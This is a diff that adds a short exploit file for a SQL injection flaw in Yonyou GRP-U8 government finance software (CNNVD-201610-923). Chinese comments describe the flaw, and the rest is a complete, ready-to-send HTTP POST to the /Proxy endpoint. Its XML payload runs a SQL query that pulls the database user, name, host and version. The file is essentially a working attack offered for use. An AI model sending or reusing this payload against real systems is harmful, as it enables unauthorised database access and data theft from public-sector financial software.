@@ -1,0 +1,11 @@
+# 利用【用友GRP-U8行政事业财务管理软件 SQL注入漏洞】（CNNVD-201610-923）
+# 用友GRP-u8存在XXE漏洞,该漏洞源于应用程序解析XML输入时没有进制外部实体的加载,导致可加载外部SQL语句,以及命令执行
+POST /Proxy?acid=30000051&bid=hd_tag_m8mv24qw HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24qw
+RM-PRO-Token: 42196e39b0b2f75926df9a90d3271eb2
+RM-PRO-Time: 1742808406503
+User-Agent: curl/7.83.1
+Content-Type: application/x-www-form-urlencoded
+
+cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select user,db_name(),host_name(),@@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>
